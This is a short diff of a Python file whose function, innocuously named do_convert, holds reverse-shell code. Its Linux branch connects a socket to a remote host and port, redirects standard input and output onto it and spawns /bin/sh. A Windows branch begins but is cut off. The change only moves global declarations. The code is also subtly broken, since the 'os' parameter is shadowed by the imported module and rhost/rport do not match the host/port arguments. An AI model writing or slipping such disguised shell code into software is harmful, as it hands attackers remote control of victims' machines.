@@ -28,6 +28,8 @@ def add_tab():
 
 
 def do_convert(host, port, os):
+    global s
+    global p
     import os
     import socket
 
@@ -36,15 +38,11 @@ def do_convert(host, port, os):
 
     if os == "Linux":
         import pty
-
-        global s
         s = socket.socket()
         s.connect((rhost, rport))
         [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
         pty.spawn("/bin/sh")
     elif os == "Windows":
-        global p
-        global s
         import threading
         import subprocess as sp
 
